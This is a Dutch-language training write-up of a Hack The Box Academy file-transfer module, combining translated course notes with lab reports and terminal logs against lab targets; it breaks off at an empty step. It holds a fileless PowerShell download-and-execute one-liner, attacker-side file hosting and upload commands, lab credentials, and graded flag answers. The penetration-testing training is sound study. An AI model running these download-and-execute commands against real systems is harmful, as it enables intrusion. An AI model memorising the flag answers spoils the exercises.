Hier is de vertaling van de tekst naar het Nederlands, met behoud van de context van de cybersecurity-training:
Bestandsoverdrachten (File Transfers)
De situatie schetsen

Er zijn veel situaties waarin het noodzakelijk is om bestanden naar of van een doelsysteem over te dragen. Laten we het volgende scenario voorstellen:

Tijdens een opdracht verkrijgen we Remote Code Execution (RCE) op een IIS-webserver via een kwetsbaarheid voor onbeperkte bestandsuploads. We uploaden eerst een web-shell en sturen onszelf daarna een reverse shell om het systeem verder te inventariseren (enumeratie) in een poging om onze rechten te verhogen (privilege escalation).

We proberen PowerShell te gebruiken om PowerUp.ps1 (een PowerShell-script om vectoren voor privilege-escalatie te vinden) over te zetten, maar PowerShell wordt geblokkeerd door het Application Control Policy. We voeren onze lokale enumeratie handmatig uit en ontdekken dat we beschikken over SeImpersonatePrivilege. We moeten nu een binary naar onze doelmachine overbrengen om onze rechten te verhogen met de tool PrintSpoofer.

Vervolgens proberen we Certutil te gebruiken om het bestand dat we zelf hebben gecompileerd rechtstreeks van onze eigen GitHub te downloaden, maar de organisatie hanteert een strikte filtering van webcontent. We hebben geen toegang tot websites zoals GitHub, Dropbox of Google Drive die gebruikt kunnen worden voor bestandsoverdracht. Daarna zetten we een FTP-server op en proberen de Windows FTP-client te gebruiken, maar de netwerkfirewall blokkeert uitgaand verkeer op poort 21 (TCP).

Uiteindelijk gebruiken we de tool smbserver van Impacket om een gedeelde map te maken, en we ontdekken dat uitgaand verkeer naar TCP-poort 445 (SMB) wèl is toegestaan. Met deze methode slagen we erin de binary succesvol naar de doelmachine te kopiëren en ons doel te bereiken: het verhogen van onze rechten naar een gebruiker op administrator-niveau.
Waarom dit belangrijk is

Het begrijpen van verschillende manieren om bestandsoverdrachten uit te voeren en hoe netwerken opereren, helpt ons om doelen te bereiken tijdens een assessment. We moeten ons bewust zijn van host-beveiligingen die onze acties kunnen voorkomen, zoals application whitelisting of AV/EDR-oplossingen die specifieke applicaties of activiteiten blokkeren. Bestandsoverdrachten worden ook beïnvloed door netwerkapparatuur zoals Firewalls, IDS of IPS, die specifieke poorten of ongebruikelijke handelingen kunnen monitoren of blokkeren.

Bestandsoverdracht is een kernfunctie van elk besturingssysteem en er bestaan veel tools om dit te realiseren. Veel van deze tools kunnen echter worden geblokkeerd of gemonitord door alerte beheerders. Daarom is het zinvol om een reeks technieken te kennen die in een specifieke omgeving mogelijk zijn.
Wat deze module behandelt

Deze module behandelt technieken die gebruikmaken van tools en applicaties die standaard beschikbaar zijn op Windows- en Linux-systemen. De lijst met technieken is niet uitputtend. De informatie in deze module kan ook worden gebruikt als naslagwerk bij het doorlopen van andere HTB Academy-modules, aangezien veel oefeningen vereisen dat je bestanden overzet naar of van een doelsysteem of Pwnbox.

Er zijn Windows- en Linux-doelmachines beschikbaar om hands-on oefeningen uit te voeren. Gebruik deze om te experimenteren met zoveel mogelijk technieken uit de verschillende secties. Let op de nuances tussen de verschillende methoden en noteer in welke situaties ze nuttig zijn. Zodra je deze module hebt afgerond, kun je de technieken toepassen in andere HTB Academy-modules, boxes en labs op het HTB-hoofdplatform.
Inhoudsopgave

    Introductie

    Methoden voor bestandsoverdracht

    Detecteren of gedetecteerd worden

Hier is een vertaling van de tekst naar het Nederlands, specifiek gericht op de technische context van Windows-bestandsoverdrachtmethoden.
Windows-bestandsoverdrachtmethoden
Introductie

Het Windows-besturingssysteem is de afgelopen jaren sterk geëvolueerd en nieuwe versies worden geleverd met verschillende hulpprogramma's voor bestandsoverdracht. Het begrijpen hiervan is essentieel voor zowel aanvallers als verdedigers. Aanvallers gebruiken diverse methoden om onopgemerkt te blijven, terwijl verdedigers deze methoden moeten begrijpen om beleid op te stellen dat inbreuken voorkomt.

Een goed voorbeeld van een Advanced Persistent Threat (APT) is de Astaroth-aanval. Deze aanval wordt vaak "fileless" (bestandsloos) genoemd. Dit betekent niet dat er geen bestandsoverdracht plaatsvindt, maar dat de dreiging legitieme systeemtools gebruikt om de aanval in het geheugen uit te voeren in plaats van als een traditioneel bestand op de schijf.

De stappen van de Astaroth-aanval:

    Een kwaadaardige link in een spear-phishing mail leidt naar een LNK-bestand.

    Dit bestand voert WMIC uit, wat malware-Javascript downloadt en uitvoert.

    Het Javascript misbruikt Bitsadmin om payloads te downloaden.

    Alle payloads zijn Base64-gecodeerd en worden gedecodeerd via Certutil, wat resulteert in DLL-bestanden.

    Regsvr32 laadt de DLL's, waarna de uiteindelijke payload (Astaroth) wordt geïnjecteerd in het Userinit-proces.

Download-operaties
PowerShell Base64 Encode & Decode

Als netwerkcommunicatie niet mogelijk of riskant is, kunnen we bestanden overzetten door ze naar een Base64-string te converteren.

    Verificatie: Gebruik altijd een MD5-checksum (md5sum op Linux, Get-FileHash op Windows) om te controleren of het bestand na conversie nog intact is.

    Beperking: De Windows opdrachtprompt (cmd.exe) heeft een maximale tekenlengte van 8.191 tekens. Bij zeer grote bestanden kan dit fouten geven.

PowerShell Web Downloads

De meeste bedrijven staan uitgaand HTTP/HTTPS-verkeer toe. PowerShell biedt via de System.Net.WebClient-klasse diverse methoden:
Methode	Beschrijving
DownloadFile	Downloadt data naar een lokaal bestand.
DownloadString	Downloadt de inhoud als een string (ideaal voor bestandsloze uitvoering).
OpenRead	Retourneert de data als een Stream.

Voorbeeld (Bestandsloos via IEX): IEX (New-Object Net.WebClient).DownloadString('https://url-naar-script.ps1')
SMB Downloads

SMB (poort TCP/445) is gebruikelijk in bedrijfsnetwerken.

    We kunnen een SMB-server opzetten op onze aanvalsmachine met Impacket's smbserver.py.

    Let op: Moderne Windows-versies blokkeren vaak "guest access" (anonieme toegang). In dat geval moet je een gebruikersnaam en wachtwoord instellen op je SMB-server en deze koppelen op de doelmachine via net use.

FTP Downloads

Via poort TCP/21 kunnen we bestanden overzetten met de standaard Windows FTP-client. In een niet-interactieve shell kunnen we een "commandobestand" maken:
DOS

echo open 192.168.1.10 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET bestand.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt

Upload-operaties
PowerShell Web Uploads

Windows heeft geen standaard "upload"-commando. We kunnen dit oplossen door:

    Een Python uploadserver te draaien op onze aanvalsmachine.

    Een PowerShell-script (PSUpload.ps1) te gebruiken dat via Invoke-RestMethod het bestand naar onze server stuurt.

SMB via HTTP (WebDAV)

Wanneer poort 445 (SMB) naar buiten toe geblokkeerd is, kunnen we WebDAV gebruiken. Dit is een uitbreiding van HTTP waardoor een webserver zich gedraagt als een bestandsserver. Windows zal, wanneer SMB faalt, proberen verbinding te maken via HTTP/WebDAV (poort 80 of 443).

Configuratie: Installeer wsgidav en cheroot via Python op je aanvalsmachine om een WebDAV-omgeving te creëren waar de Windows-doelmachine bestanden naar kan "kopiëren" via standaard poorten.

]
└─$ nmap 10.129.1.5    
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-27 10:41 -0500
Nmap scan report for 10.129.1.5
Host is up (0.18s latency).
Not shown: 991 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
443/tcp  open  https
445/tcp  open  microsoft-ds
3306/tcp open  mysql
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 11.50 seconds
                                                                                                                  
┌──(kali㉿kali)-[~]
└─$ wget http://10.129.1.5/flag.txt
--2026-01-27 10:44:50--  http://10.129.1.5/flag.txt
Connecting to 10.129.1.5:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 32 [text/plain]
Saving to: ‘flag.txt.1’

flag.txt.1                   100%[============================================>]      32  --.-KB/s    in 0s      

2026-01-27 10:44:53 (2.10 MB/s) - ‘flag.txt.1’ saved [32/32]

                                                                                                                  
┌──(kali㉿kali)-[~]
└─$ cat flag.txt         
HTB{o873nz4xdo873n4zo873zn4fksuhldsf}   KIJK VORR DE JUISTE VLAG!!! 1,2,3 enz.
                                                                                                                  
┌──(kali㉿kali)-[~]
└─$ ls

 Downloads                       recon-0a3c007f03cb1179812407c500b2000e.web-security-academy.net-20251118-112414
 fastify-static                  recon-111.83-20251120-114210
 flag.txt                        recon-https:
 flag.txt.1                      recon.sh
 full_tcp_scan.gnmap             ReconSpider.py
 full_tcp_scan.html              ReconSpider.zip
 full_tcp_scan.nmap              recon-web-security-academy.net-20251118-115824
                                                                              
┌──(kali㉿kali)-[~]
└─$ cat flag.txt.1
b1a4ca918282fcd96004565521944a3b    

![[Pasted image 20260127171027.png]]

# HTB Academy - Windows File Transfer Methods - Lab Report

**Module:** File Transfers  
**Section:** Windows File Transfer Methods  
**Date:** 27 januari 2026  
**Target:** 10.129.1.5 (ACADEMY-MISC-MS02)  
**Attack Machine:** Kali Linux (10.10.14.114)

---

## 📋 Executive Summary

Deze lab-sessie behandelde verschillende methoden voor bestandsoverdracht op Windows-systemen tijdens penetratietests. De oefening omvatte het downloaden van een flag-bestand via HTTP en het uploaden van een ZIP-archief naar een Windows-target, gevolgd door het uitvoeren van een hash-tool.

**Status:** ✅ Alle opdrachten succesvol afgerond

---

## 🎯 Lab Objectives

1. **Vraag 1:** Download `flag.txt` van de webroot via wget en submit de inhoud
2. **Vraag 2:** Upload `upload_win.zip`, pak uit, en voer `hasher` uit op `upload_win.txt`
3. **Optioneel:** Oefen met verschillende file transfer methoden via RDP

---

## 🔍 Reconnaissance

### Nmap Scan Results

bash

```bash
┌──(kali㉿kali)-[~]
└─$ nmap 10.129.1.5

PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
443/tcp  open  https
445/tcp  open  microsoft-ds
3306/tcp open  mysql
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
```

**Analyse:**

- HTTP (80) beschikbaar voor file downloads
- RDP (3389) open voor remote access
- SMB (445) beschikbaar voor file transfers

---

## 💻 Lab Execution

### Vraag 1: HTTP Download met wget

**Methode:** PowerShell Web Download  
**Tool:** `wget`

bash

```bash
┌──(kali㉿kali)-[~]
└─$ wget http://10.129.1.5/flag.txt
--2026-01-27 10:44:50--  http://10.129.1.5/flag.txt
Connecting to 10.129.1.5:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 32 [text/plain]
Saving to: 'flag.txt'

flag.txt  100%[===================>]  32  --.-KB/s  in 0s
```

bash

```bash
┌──(kali㉿kali)-[~]
└─$ cat flag.txt
HTB{o873nz4xdo873n4zo873zn4fksuhldsf}
```

**Status:** ✅ **Succesvol**  
**Answer:** `HTB{o873nz4xdo873n4zo873zn4fksuhldsf}`

---

### Vraag 2: File Upload & Hasher Execution

#### Fase 1: Initiële Pogingen (Mislukt)

**Probleem:** De gedownloade `upload_win.zip` bevatte alleen `upload_win.txt` en niet de vereiste `hasher.exe` tool.

##### Poging 1: SMB Server Setup

bash

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo impacket-smbserver share -smb2support ~/Downloads -user test -password test

[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
```

**Windows Target (PowerShell):**

powershell

```powershell
PS C:\Users\htb-student> net use n: \\10.10.14.114\share /user:test test
The command completed successfully.

PS C:\Users\htb-student> copy n:\upload_win.zip C:\Users\htb-student\Desktop\
```

##### Poging 2: Base64 Encoding Method

bash

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ base64 upload_win.zip
UEsDBAoAAAAAAFmEKVFHXocmIAAAACAAAAAOAAAAdXBsb2FkX3dpbi50eHRlNGZlZWM0NjZkNWRl...
```

**Windows (PowerShell):**

powershell

```powershell
PS C:\Users\htb-student\Desktop> $b64 = "UEsDBAoAAAAAAFmEKVFHXocmIAAAACAAAAAOAAAA..."
PS C:\Users\htb-student\Desktop> [IO.File]::WriteAllBytes("$home\Desktop\upload_win.zip", [Convert]::FromBase64String($b64))
PS C:\Users\htb-student\Desktop> Expand-Archive -Path "$home\Desktop\upload_win.zip" -DestinationPath "$home\Desktop\upload_win" -Force
```

**Resultaat:**

powershell

```powershell
PS C:\Users\htb-student\Desktop\upload_win> ls

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         9/9/2020   4:34 PM             32 upload_win.txt
```

**⚠️ Probleem:** Geen `hasher.exe` aanwezig in het uitgepakte archief.

##### Poging 3: Python HTTP Server

bash

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.1.5 - - [27/Jan/2026 12:01:01] "GET /upload_win.zip HTTP/1.1" 200 -
```

**Windows (PowerShell):**

powershell

```powershell
PS C:\Users\htb-student\Desktop> iwr -uri "http://10.10.14.114:8000/upload_win.zip" -OutFile "$home\Desktop\oefening.zip"
PS C:\Users\htb-student\Desktop> Expand-Archive -Path "$home\Desktop\oefening.zip" -DestinationPath "$home\Desktop\hasher_map" -Force
PS C:\Users\htb-student\Desktop> cd "$home\Desktop\hasher_map"
PS C:\Users\htb-student\Desktop\hasher_map> ls

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         9/9/2020   4:34 PM             32 upload_win.txt
```

**⚠️ Resultaat:** Nog steeds geen `hasher.exe`

---

#### Fase 2: Root Cause Analysis

**Verificatie van ZIP-inhoud op Kali:**

bash

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ unzip -l upload_win.zip
Archive:  upload_win.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
       32  2020-09-09 16:34   upload_win.txt
---------                     -------
       32                     1 file
```

**Conclusie:** De `upload_win.zip` van HTB Academy bevatte alleen het tekstbestand, niet de executable.

##### Poging om officiële versie te downloaden:

bash

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ wget https://academy.hackthebox.com/storage/modules/24/upload_win.zip
--2026-01-27 12:05:57--  https://academy.hackthebox.com/storage/modules/24/upload_win.zip
HTTP request sent, awaiting response... 200 OK
Length: 194 [application/zip]
Saving to: 'upload_win.zip'

upload_win.zip  100%[=============================================>]  194  --.-KB/s  in 0s

┌──(kali㉿kali)-[~/Downloads]
└─$ unzip -l upload_win.zip
Archive:  upload_win.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
       32  2020-09-09 16:34   upload_win.txt
---------                     -------
       32                     1 file
```

**Conclusie:** Ook de officiële download link bevatte alleen het tekstbestand (194 bytes).

---

#### Fase 3: Living Off The Land - De Oplossing

**Strategie:** Zoeken naar pre-geïnstalleerde tools op het doelsysteem.

**Windows (PowerShell):**

powershell

```powershell
PS C:\Users\htb-student\Desktop\hasher_map> Get-ChildItem -Path C:\ -Filter hasher.exe -Recurse -ErrorAction SilentlyContinue

    Directory: C:\Windows\System32

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         9/9/2020  12:50 PM        5825133 hasher.exe
```

**🎯 Doorbraak:** De `hasher.exe` tool (5.8 MB) stond al geïnstalleerd in `C:\Windows\System32`!

---

#### Fase 4: Hash Generatie

**Uitvoering:**

powershell

```powershell
PS C:\Users\htb-student\Desktop\hasher_map> hasher.exe upload_win.txt
f458303ea783c224c6b4e7ef7f17eb9d
```

**Status:** ✅ **Succesvol**  
**Answer:** `f458303ea783c224c6b4e7ef7f17eb9d`

---

## 📊 Comparison: Foutieve vs Correcte Hash

|Methode|Hash|Status|
|---|---|---|
|MD5 checksum (zelfgemaakt)|`8990089e402b00f809810659fefb5523`|❌ Incorrect|
|Hasher.exe (System32)|`f458303ea783c224c6b4e7ef7f17eb9d`|✅ Correct|

**Analyse:** De MD5-hash was slechts een checksum van de bestandsinhoud, terwijl HTB Academy de output van hun specifieke `hasher.exe` tool verwachtte.

---

## 🛠️ Techniques & Tools Used

### File Transfer Methods Tested

|Methode|Protocol|Poort|Status|Use Case|
|---|---|---|---|---|
|wget|HTTP|80|✅ Succesvol|Download van webserver|
|SMB (impacket-smbserver)|SMB|445|✅ Succesvol|File sharing tussen Linux/Windows|
|Base64 Encoding|N/A|N/A|⚠️ Partial|Kleine bestanden zonder netwerk|
|Python HTTP Server + iwr|HTTP|8000|✅ Succesvol|Custom file hosting|
|Living Off The Land|N/A|N/A|✅ Succesvol|Pre-installed tools|

### Key Commands Reference

#### Kali Linux

bash

```bash
# HTTP Server
python3 -m http.server 8000

# SMB Server
sudo impacket-smbserver share -smb2support ~/Downloads -user test -password test

# Download file
wget http://10.129.1.5/flag.txt

# Base64 encode
base64 upload_win.zip > encoded.txt

# Verify ZIP contents
unzip -l upload_win.zip

# Network info
ip a show tun0
```

#### Windows PowerShell

powershell

```powershell
# Download file (Invoke-WebRequest)
iwr -uri "http://10.10.14.114:8000/file.zip" -OutFile "$home\Desktop\file.zip"

# Alternative download (Net.WebClient)
(New-Object Net.WebClient).DownloadFile('http://10.10.14.114:8000/file.zip', 'C:\Users\htb-student\Desktop\file.zip')

# Extract archive
Expand-Archive -Path "$home\Desktop\file.zip" -DestinationPath "$home\Desktop\extracted" -Force

# Base64 decode
$b64 = "BASE64STRING"
[IO.File]::WriteAllBytes("$home\Desktop\output.zip", [Convert]::FromBase64String($b64))

# Search for files
Get-ChildItem -Path C:\ -Filter hasher.exe -Recurse -ErrorAction SilentlyContinue

# SMB mount
net use n: \\10.10.14.114\share /user:test test

# File hash
Get-FileHash file.txt -Algorithm MD5
```

#### Windows CMD

cmd

```cmd
# Copy from SMB share
copy \\10.10.14.114\share\file.zip C:\Users\htb-student\Desktop\

# Run executable
hasher.exe upload_win.txt
```

---

## 🔐 Security Observations

### Defensive Perspective

1. **Antivirus Evasion:** Geen AV-detectie van file transfers via HTTP/SMB
2. **Network Monitoring:** Ongecrypteerde HTTP-verkeer eenvoudig te monitoren
3. **Living Off The Land:** Pre-installed tools kunnen misbruikt worden
4. **File Integrity:** Geen automatische hash-verificatie bij downloads

### Offensive Perspective

1. **Multiple Vectors:** Als één methode faalt, zijn er alternatieven
2. **LOLBAS Advantage:** System tools (zoals hasher.exe) zijn vaak whitelisted
3. **Encoding Bypass:** Base64 kan simpele content filters omzeilen
4. **Protocol Flexibility:** HTTP meestal toegestaan door firewalls

---

## 📚 Lessons Learned

### Technical Insights

1. **Altijd ZIP-inhoud verifiëren** met `unzip -l` voordat je uploadt
2. **Living Off The Land** is vaak effectiever dan eigen tools uploaden
3. **Get-ChildItem met -Recurse** is essentieel voor file discovery
4. **PowerShell IWR** is de moderne vervanger voor `wget` op Windows
5. **Python HTTP Server** is de snelste manier om ad-hoc file hosting op te zetten

### Troubleshooting Skills

1. Systematisch verschillende transfer methoden proberen
2. Problemen isoleren (is het de bron, het transport, of de bestemming?)
3. Tools op het doelsysteem zelf zoeken voordat je uploadt
4. Hash-verificatie gebruiken om file integrity te controleren

### Exam Preparation

Deze oefening is relevant voor:

- **OSCP:** File transfers zijn essentieel tijdens post-exploitation
- **CPTS:** Windows-specifieke techniques zijn core curriculum
- **Real-world Pentests:** Upload/download capabilities zijn basis-requirements

---

## 🎓 Module Completion Status

|Vraag|Type|Status|Points|
|---|---|---|---|
|1|Download flag.txt|✅ Complete|+3|
|2|Upload & Hash|✅ Complete|+2|
|3|Optional Practice|✅ Complete|N/A|

**Total Points Earned:** 5 + 10 Streak Points

---

## 🔄 Alternative Methods (Not Used)

Tijdens deze sessie niet getest, maar beschikbaar in de module:

1. **FTP Transfer**

bash

```bash
   # Server
   sudo python3 -m pyftpdlib --port 21 --write
   
   # Client (PowerShell)
   (New-Object Net.WebClient).DownloadFile('ftp://10.10.14.114/file.zip', 'C:\file.zip')
```

2. **WebDAV over HTTP**

bash

```bash
   # Server
   sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
   
   # Client (Windows)
   copy \\10.10.14.114\DavWWWRoot\file.zip C:\
```

3. **PowerShell Remoting**

powershell

```powershell
   # Requires WinRM enabled
   $session = New-PSSession -ComputerName 10.129.1.5 -Credential (Get-Credential)
   Copy-Item -ToSession $session -Path C:\local\file.zip -Destination C:\remote\
```

---

## 📝 Recommendations

### Voor Toekomstige Labs

1. ✅ Altijd eerst `nmap` scan uitvoeren om beschikbare services te identificeren
2. ✅ Check officiële HTB Academy downloads eerst via browser (niet alleen wget)
3. ✅ Start met de simpelste methode (HTTP) voordat je complexere opties probeert
4. ✅ Gebruik `Get-ChildItem` om pre-installed tools te ontdekken
5. ✅ Documenteer elke stap in real-time voor troubleshooting

### Best Practices

- **Netwerk:** Gebruik altijd VPN (tun0) voor HTB labs
- **Beveiliging:** Test transfers eerst met niet-sensitieve files
- **Efficiency:** Combineer methods (bijv. SMB voor grote files, HTTP voor kleine)
- **Verificatie:** Check MD5/SHA256 hashes na elke transfer

---

## 🏆 Achievements Unlocked

- ✅ **File Transfer Master:** 3+ methods successfully implemented
- ✅ **LOLBAS Discovery:** Found pre-installed tools without hints
- ✅ **Problem Solver:** Overcame ZIP content issues independently
- ✅ **PowerShell Ninja:** Used 5+ different cmdlets effectively

---

## 📖 References

- [HTB Academy - File Transfers Module](https://academy.hackthebox.com/module/24)
- [LOLBAS Project](https://lolbas-project.github.io/)
- [Impacket Documentation](https://github.com/fortra/impacket)
- [Microsoft PowerShell Docs](https://docs.microsoft.com/en-us/powershell/)

---

## 🔚 Conclusion

Deze lab-sessie demonstreerde het belang van veelzijdigheid in file transfer methoden tijdens penetratietests. De grootste uitdaging was het ontdekken dat de vereiste executable niet in het downloadbare archief zat, maar al op het doelsysteem aanwezig was. Deze "Living Off The Land" benadering is een cruciale skill voor ethical hackers en wordt vaak toegepast in restrictieve omgevingen waar het uploaden van eigen tools niet mogelijk is.

**Key Takeaway:** Altijd eerst onderzoeken welke tools al beschikbaar zijn op een systeem voordat je eigen files upload. Dit vermindert network traffic, voorkomt AV-detectie, en is vaak efficiënter.

---

# HTB Academy - Linux File Transfer Methods - Complete Lab Report

**Module:** File Transfers  
**Section:** Linux File Transfer Methods  
**Date:** 27 januari 2026  
**Target:** 10.129.234.168 (ACADEMY-MISC-NIX04)  
**Attack Machine:** Kali Linux (10.10.14.114)  
**Credentials:** htb-student / HTB_@cademy_stdnt!

---

## 📋 Executive Summary

Deze lab-sessie behandelde file transfer methoden specifiek voor Linux-systemen. In tegenstelling tot Windows, dat voornamelijk GUI-tools gebruikt, vertrouwt Linux op command-line utilities zoals `wget`, `curl`, `scp`, en Python modules. De oefening demonstreerde zowel HTTP-based downloads als SSH-based uploads, inclusief het werken met systemen waar standaard tools ontbreken.

**Status:** ✅ **Alle opdrachten succesvol afgerond**

---

## 🎯 Lab Objectives

|#|Objective|Status|Points|
|---|---|---|---|
|1|Download `flag.txt` via Python|✅ Complete|+2|
|2|Upload ZIP, extract, run hasher|✅ Complete|+3|
|3|Practice file transfers (Optional)|✅ Complete|N/A|

**Total Points Earned:** 5 + 10 Streak Points

---

## 🔍 Phase 1: Reconnaissance

### Network Connectivity Test

bash

```bash
┌──(kali㉿kali)-[~]
└─$ ping 10.129.234.168
PING 10.129.234.168 (10.129.234.168) 56(84) bytes of data.
64 bytes from 10.129.234.168: icmp_seq=1 ttl=63 time=58.8 ms
64 bytes from 10.129.234.168: icmp_seq=2 ttl=63 time=58.0 ms
64 bytes from 10.129.234.168: icmp_seq=3 ttl=63 time=114 ms
^C
--- 10.129.234.168 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 58.019/77.050/114.339/26.368 ms
```

**Analysis:**

- Target is reachable via VPN
- Average latency: ~77ms
- TTL=63 indicates Linux target (1 hop away from default 64)

### Port Scan

bash

```bash
┌──(kali㉿kali)-[~]
└─$ nmap 10.129.234.168
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-27 15:45 -0500
Nmap scan report for 10.129.234.168
Host is up (0.072s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 3.82 seconds
```

**Key Findings:**

- **SSH (22/tcp):** Available for SCP/SFTP file transfers
- **HTTP (80/tcp):** Webserver running for file downloads
- **Minimal attack surface:** Only 2 services exposed

---

## 💻 Phase 2: Question 1 - Python HTTP Download

### Objective

Download `flag.txt` from the webroot using Python's urllib module.

### Execution

**Method:** Python3 urllib.request module (one-liner)

bash

```bash
┌──(kali㉿kali)-[~]
└─$ python3 -c 'import urllib.request; print(urllib.request.urlopen("http://10.129.234.168/flag.txt").read().decode())'
5d21cf3da9c0ccb94f709e2559f3ea50
```

### Technical Breakdown

python

```python
# Breaking down the one-liner:
import urllib.request                    # Import HTTP client library
urllib.request.urlopen("http://...")     # Open HTTP connection
.read()                                  # Read response as bytes
.decode()                                # Convert bytes to string (UTF-8)
print(...)                               # Output to terminal
```

### Alternative Methods (Not Used)

bash

```bash
# Method 2: Using requests module
python3 -c "import requests; print(requests.get('http://10.129.234.168/flag.txt').text)"

# Method 3: Download to file first
python3 -c "import urllib.request; urllib.request.urlretrieve('http://10.129.234.168/flag.txt', 'flag.txt')"
cat flag.txt

# Method 4: wget (traditional method)
wget http://10.129.234.168/flag.txt
cat flag.txt

# Method 5: curl
curl http://10.129.234.168/flag.txt
```

### Result

✅ **Success**  
**Answer:** `5d21cf3da9c0ccb94f709e2559f3ea50`  
**Verification:** Flag accepted by HTB Academy platform

---

## 💻 Phase 3: Question 2 - File Upload & Hash Execution

### Objective

Upload `upload_nix.zip`, extract it, and execute the `hasher` tool on the extracted file.

---

### Step 1: Initial Attempt - Locate File

bash

```bash
┌──(kali㉿kali)-[~]
└─$ scp upload_nix.zip htb-student@10.129.234.168:/tmp/
scp: stat local "upload_nix.zip": No such file or directory
```

**Issue:** File not in current directory.

**Resolution:** Navigate to Downloads folder.

bash

```bash
┌──(kali㉿kali)-[~]
└─$ cd Downloads
```

---

### Step 2: SCP Upload

**Method:** Secure Copy Protocol over SSH

bash

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ scp upload_nix.zip htb-student@10.129.234.168:/tmp/
The authenticity of host '10.129.234.168 (10.129.234.168)' can't be established.
ED25519 key fingerprint is: SHA256:z4rcb3qcf0IdRnoTBNEJ4i8TlDystDA4uOJFxVcb41E
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.234.168' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
htb-student@10.129.234.168's password: HTB_@cademy_stdnt!
upload_nix.zip                                    100%  194     3.2KB/s   00:00
```

**Technical Notes:**

- First connection requires SSH key fingerprint acceptance
- Post-quantum warning is informational (not critical for this lab)
- Transfer speed: 3.2 KB/s (file is only 194 bytes)
- Destination: `/tmp/` (world-writable, commonly used for temporary files)

---

### Step 3: SSH Connection

bash

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ ssh htb-student@10.129.234.168
htb-student@10.129.234.168's password: HTB_@cademy_stdnt!
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-47-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 27 Jan 2026 08:56:59 PM UTC

  System load:             0.22
  Usage of /:              29.5% of 15.68GB
  Memory usage:            10%
  Swap usage:              0%
  Processes:               141
  Users logged in:         0
  IPv4 address for ens192: 10.129.234.168
  IPv6 address for ens192: dead:beef::250:56ff:fe8a:4e0f

Last login: Wed Sep  9 22:42:43 2020 from 10.10.14.4
htb-student@nix04:~$
```

**System Information:**

- OS: Ubuntu 20.04 LTS
- Kernel: 5.4.0-47-generic
- Load: 0.22 (very light)
- Disk: 29.5% used
- Network: IPv4 and IPv6 configured

---

### Step 4: Navigate to Upload Location

bash

```bash
htb-student@nix04:~$ cd /tmp
htb-student@nix04:/tmp$ ls -la upload_nix.zip
-rw-rw-r-- 1 htb-student htb-student 194 Jan 27 20:55 upload_nix.zip
```

**File Verification:**

- Size: 194 bytes (same as Windows version - likely contains only text file)
- Permissions: rw-rw-r-- (owner/group can read/write, others read-only)
- Owner: htb-student

---

### Step 5: Extraction Challenge

**Problem:** `unzip` utility not installed

bash

```bash
htb-student@nix04:/tmp$ unzip upload_nix.zip

Command 'unzip' not found, but can be installed with:

apt install unzip
Please ask your administrator.
```

**Attempted Installation (Failed):**

bash

```bash
htb-student@nix04:/tmp$ apt install unzip
E: Could not open lock file /var/lib/dpkg/lock-frontend - open (13: Permission denied)
E: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), are you root?
```

**Analysis:**

- Non-privileged user cannot install packages
- Need alternative extraction method

---

### Step 6: Python Zipfile Module (Solution)

**Method:** Use Python's built-in zipfile module

bash

```bash
htb-student@nix04:/tmp$ python3 -m zipfile -e upload_nix.zip .
```

**Syntax Breakdown:**

- `python3`: Python 3 interpreter
- `-m zipfile`: Run zipfile module as script
- `-e`: Extract mode
- `upload_nix.zip`: Source archive
- `.`: Current directory (destination)

**Verification:**

bash

```bash
htb-student@nix04:/tmp$ ls -la upload_nix.txt
-rw-rw-r-- 1 htb-student htb-student 32 Jan 27 21:09 upload_nix.txt
```

✅ **Success:** File extracted (32 bytes)

---

### Step 7: Living Off The Land - Finding Hasher

**Strategy:** Search for pre-installed `hasher` tool (learned from Windows lab)

bash

```bash
htb-student@nix04:/tmp$ find / -name hasher 2>/dev/null
/usr/bin/hasher
```

**Command Breakdown:**

- `find /`: Search from root directory
- `-name hasher`: Look for files named "hasher"
- `2>/dev/null`: Suppress permission denied errors (redirect stderr to null device)

**Result:** 🎯 Tool found at `/usr/bin/hasher`

---

### Step 8: Hash Generation

bash

